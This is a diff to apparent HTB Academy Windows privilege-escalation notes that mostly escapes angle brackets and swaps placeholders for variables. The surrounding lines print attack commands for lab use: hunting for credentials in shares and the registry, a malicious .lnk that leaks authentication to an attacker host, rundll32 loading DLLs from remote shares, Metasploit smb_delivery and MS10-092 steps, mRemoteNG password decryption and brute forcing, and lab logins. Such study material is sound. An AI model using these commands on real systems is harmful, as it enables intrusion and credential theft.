@@ -5357,7 +5357,7 @@ where /R C:\ *.config
 
 ```cmd wrap
 # StickyNotes SQLite database location:
-C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
+C:\Users\$USER\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
 
 # Associated files:
 plum.sqlite         # Main database
@@ -5522,23 +5522,23 @@ Text
 
 ```cmd wrap
 # Common network share credential hunting:
-net view \\<server>
-dir \\<server>\users\*
-dir \\<server>\shared\*
+net view \\\<server>
+dir \\\<server>\users\*
+dir \\\<server>\shared\*
 
 # Tools for automated share hunting:
-Snaffler.exe -s <domain-controller> -d <domain>
+Snaffler.exe -s \<domain-controller> -d $DOMAIN
 ```
 
 ### High-Value Share Locations
 
 ```cmd wrap
 # Common share paths with credentials:
-\\<server>\users\<username>\                  # Personal folders
-\\<server>\shared\IT\                         # IT department files
-\\<server>\applications\configs\              # Application configurations
-\\<server>\backup\                            # Backup files
-\\<server>\temp\                              # Temporary files
+\\\<server>\users\$USER\                  # Personal folders
+\\\<server>\shared\IT\                         # IT department files
+\\\<server>\applications\configs\              # Application configurations
+\\\<server>\backup\                            # Backup files
+\\\<server>\temp\                              # Temporary files
 ```
 
 ## 🛠️ Advanced Search Techniques
@@ -5561,7 +5561,7 @@ Select-String -Pattern "bob_adm|administrator|admin" -ErrorAction SilentlyContin
 
 ```cmd wrap
 # Extract strings from binary files
-strings.exe <binary_file> | findstr /i password
+strings.exe \<binary_file> | findstr /i password
 
 # Search registry for stored credentials
 reg query HKLM /f password /t REG_SZ /s
@@ -6010,8 +6010,8 @@ HKEY_LOCAL_MACHINE\SYSTEM\Current001\Services\SNMP
 
 ```cmd wrap
 # UNC paths that work in dialog boxes:
-\\127.0.0.1\c$\users\<username>    # Local admin share
-\\<ip>\<share>                     # Remote SMB share
+\\127.0.0.1\c$\users\$USER    # Local admin share
+\\$IP\\<share>                     # Remote SMB share
 \\localhost\c$\                    # Alternative localhost syntax
 ```
 
@@ -6034,7 +6034,7 @@ smbserver.py -smb2support share $(pwd)
 ```cmd wrap
 # Steps:
 1. Open Paint > File > Open
-2. Enter UNC path: \\<attacker_ip>\share
+2. Enter UNC path: \\\<attacker_ip>\share
 3. Set File-Type to "All Files"
 4. Browse and execute files directly from share
 
@@ -6047,7 +6047,7 @@ smbserver.py -smb2support share $(pwd)
 
 ```c wrap
 // pwn.c - Simple CMD launcher
-#include <stdlib.h>
+#include \<stdlib.h>
 int main() {
   system("C:\\Windows\\System32\\cmd.exe");
 }
@@ -6122,7 +6122,7 @@ int main() {
 # Alternative targets:
 C:\Windows\System32\powershell.exe
 C:\Windows\System32\mmc.exe
-\\<ip>\share\<tool>.exe
+\\$IP\share\\<tool>.exe
 ```
 
 ### Creating New Shortcuts
@@ -6130,7 +6130,7 @@ C:\Windows\System32\mmc.exe
 ```powershell wrap
 # PowerShell method for .lnk creation:
 $WshShell = New-Object -comObject WScript.Shell
-$Shortcut = $WshShell.CreateShortcut("C:\Users\<user>\Desktop\pwn.lnk")
+$Shortcut = $WshShell.CreateShortcut("C:\Users\$USER\Desktop\pwn.lnk")
 $Shortcut.TargetPath = "C:\Windows\System32\cmd.exe"
 $Shortcut.Save()
 ```
@@ -6293,13 +6293,13 @@ dir *.txt
 
 ```cmd wrap
 # 1. Initial access via dialog box
-Paint > File > Open > \\127.0.0.1\c$\users\<user>
+Paint > File > Open > \\127.0.0.1\c$\users\$USER
 
 # 2. SMB server setup
 smbserver.py -smb2support share $(pwd)
 
 # 3. Tool transfer and execution  
-\\<attacker_ip>\share\pwn.exe
+\\\<attacker_ip>\share\pwn.exe
 
 # 4. Privilege enumeration
 .\PowerUp.ps1 
@@ -6419,10 +6419,10 @@ evil.bat              # Simple batch breakout
 
 ```bash wrap
 # On attack machine - passive traffic capture:
-tcpdump -i <interface> -w capture.pcap
+tcpdump -i $INTERFACE -w capture.pcap
 
 # Using net-creds for credential extraction:
-net-creds -i <interface>           # Live interface monitoring
+net-creds -i $INTERFACE           # Live interface monitoring
 net-creds -p capture.pcap          # PCAP file analysis
 
 # Let tools run in background during assessment
@@ -6582,7 +6582,7 @@ ADMINISTRATOR::WINLPE-SRV01:815c504e7b06ebda:...:Welcome1
 # Create malicious .lnk file:
 $objShell = New-Object -ComObject WScript.Shell
 $lnk = $objShell.CreateShortcut("C:\legit.lnk")
-$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
+$lnk.TargetPath = "\\\<attackerIP>\@pwn.png"
 $lnk.WindowStyle = 1
 $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
 $lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
@@ -6594,7 +6594,7 @@ $lnk.Save()
 
 ```cmd wrap
 # Key properties for stealth:
-TargetPath:     \\<attacker_ip>\@<fake_file>
+TargetPath:     \\\<attacker_ip>\@\<fake_file>
 IconLocation:   %windir%\system32\shell32.dll, 3
 WindowStyle:    1 (hidden)
 Description:    Legitimate-looking description
@@ -6860,8 +6860,8 @@ ls C:\Users\*\AppData\Roaming\mRemoteNG
 ```xml wrap
 <!-- Example confCons.xml with default master password -->
 <?XML version="1.0" encoding="utf-8"?>
-<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe" ConfVersion="2.6">
-    <Node Name="RDP_Domain" Type="Connection" Username="administrator" Domain="test.local" Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" Hostname="10.0.0.10" Protocol="RDP" Port="3389" />
+\<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe" ConfVersion="2.6">
+    \<Node Name="RDP_Domain" Type="Connection" Username="administrator" Domain="test.local" Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" Hostname="10.0.0.10" Protocol="RDP" Port="3389" />
 </mrng:Connections>
 ```
 
@@ -6874,12 +6874,12 @@ python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8L
 # Result: ASDki230kasd09fk233aDA
 
 # Custom master password decryption:
-python3 mremoteng_decrypt.py -s "<encrypted_password>" -p admin
+python3 mremoteng_decrypt.py -s "\<encrypted_password>" -p admin
 
 # Brute force master password:
 for password in $(cat /usr/share/wordlists/fasttrack.txt); do 
     echo $password
-    python3 mremoteng_decrypt.py -s "<encrypted_password>" -p $password 2>/dev/null
+    python3 mremoteng_decrypt.py -s "\<encrypted_password>" -p $password 2>/dev/null
 done
 ```
 
@@ -6970,7 +6970,7 @@ echo $env:RESTIC_PASSWORD
 
 # Repository operations:
 restic.exe -r E:\restic2 snapshots    # List backups
-restic.exe -r E:\restic2 restore <ID> --target C:\Restore
+restic.exe -r E:\restic2 restore \<ID> --target C:\Restore
 ```
 
 ### Backup Repository Enumeration
@@ -7013,8 +7013,8 @@ C:\Users\*\Documents\              # User documents
 ```cmd wrap
 # Various user credentials:
 Peter:Bambi123           # Lab 1-2
-Grace:<to_be_found>      # Lab 3  
-Jeff:<to_be_found>       # Lab 4-5
+Grace:\<to_be_found>      # Lab 3  
+Jeff:\<to_be_found>       # Lab 4-5
 ```
 
 ### Lab 1: Application Identification
@@ -7042,7 +7042,7 @@ ls C:\Users\*\AppData\Roaming\mRemoteNG\confCons.xml
 
 # Extract password hash from XML
 # Use mremoteng_decrypt.py:
-python3 mremoteng_decrypt.py -s "<Grace_password_hash>"
+python3 mremoteng_decrypt.py -s "\<Grace_password_hash>"
 
 # Expected result: Grace's cleartext password
 ```
@@ -7086,9 +7086,9 @@ findstr /SIM /C:"password" *.txt *.ini *.cfg *.config
 # Method: Restic restore + SAM/SYSTEM extraction
 
 # Restore backup containing SAM/SYSTEM:
-$env:RESTIC_PASSWORD = '<discovered_password>'
-restic.exe -r <repository_path> snapshots
-restic.exe -r <repository_path> restore <snapshot_id> --target C:\Restore
+$env:RESTIC_PASSWORD = '\<discovered_password>'
+restic.exe -r \<repository_path> snapshots
+restic.exe -r \<repository_path> restore \<snapshot_id> --target C:\Restore
 
 # Navigate to restored Windows config:
 cd C:\Restore\C\Windows\System32\config
@@ -7232,7 +7232,7 @@ rundll32.exe user32.dll,LockWorkStation
 rundll32.exe shell32.dll,ShellExec_RunDLL cmd.exe
 
 # Remote DLL execution:
-rundll32.exe \\<ip>\share\malicious.dll,EntryPoint
+rundll32.exe \\$IP\share\malicious.dll,EntryPoint
 ```
 
 ## 🔺 AlwaysInstallElevated Exploitation
@@ -7459,8 +7459,8 @@ The most vulnerable box ever!
 
 ```cmd wrap
 # Domain user descriptions (if domain-joined):
-net user <username> /domain
-Get-ADUser -Identity <username> -Properties Description
+net user $USER /domain
+Get-ADUser -Identity $USER -Properties Description
 ```
 
 ## 🎯 HTB Academy Lab Solution
@@ -7655,13 +7655,13 @@ sudo msfconsole -q
 use exploit/windows/smb/smb_delivery
 
 # Configure options:
-set LHOST <attacker_ip>
-set SRVHOST <attacker_ip>
+set LHOST \<attacker_ip>
+set SRVHOST \<attacker_ip>
 set target 0                    # DLL target
 exploit
 
 # Result: Rundll32 command for target execution
-rundll32.exe \\<attacker_ip>\<share>\test.dll,0
+rundll32.exe \\\<attacker_ip>\\<share>\test.dll,0
 ```
 
 ### Initial Shell Acquisition
@@ -7698,7 +7698,7 @@ meterpreter > background
 # Use Task Scheduler exploit:
 use exploit/windows/local/ms10_092_schelevator
 set SESSION 1
-set LHOST <attacker_ip>
+set LHOST \<attacker_ip>
 set LPORT 4443
 exploit
 
@@ -7728,9 +7728,9 @@ exploit
 
 ```bash wrap
 # Connect via RDP:
-rdesktop -u htb-student -p 'HTB_@cademy_stdnt!' <target_ip>
+rdesktop -u htb-student -p 'HTB_@cademy_stdnt!' \<target_ip>
 # Alternative if xfreerdp fails:
-# rdesktop -u htb-student -p HTB_@cademy_stdnt! <target_ip>
+# rdesktop -u htb-student -p HTB_@cademy_stdnt! \<target_ip>
 ```
 
 #### 2. Patch Level Enumeration
@@ -7770,8 +7770,8 @@ sudo msfconsole -q
 use exploit/windows/smb/smb_delivery
 
 # Configure module:
-set LHOST <your_vpn_ip>
-set SRVHOST <your_vpn_ip>
+set LHOST \<your_vpn_ip>
+set SRVHOST \<your_vpn_ip>
 exploit
 
 # Copy the rundll32 command provided
@@ -7782,7 +7782,7 @@ exploit
 
 ```cmd wrap
 # Execute in Command Prompt on target:
-rundll32.exe \\<your_vpn_ip>\<share>\test.dll,0
+rundll32.exe \\\<your_vpn_ip>\\<share>\test.dll,0
 
 # Result: Meterpreter session established
 ```
@@ -7807,7 +7807,7 @@ bg
 # Use MS10-092 exploit:
 use exploit/windows/local/ms10_092_schelevator
 set SESSION 1
-set LHOST <your_vpn_ip>
+set LHOST \<your_vpn_ip>
 set LPORT 4443
 exploit
 
@@ -8067,7 +8067,7 @@ Invoke-MS16-032
 
 ```bash wrap
 # Connect via RDP:
-xfreerdp /v:<target_ip> /u:htb-student /p:HTB_@cademy_stdnt!
+xfreerdp /v:\<target_ip> /u:htb-student /p:HTB_@cademy_stdnt!
 ```
 
 #### 2. System Enumeration
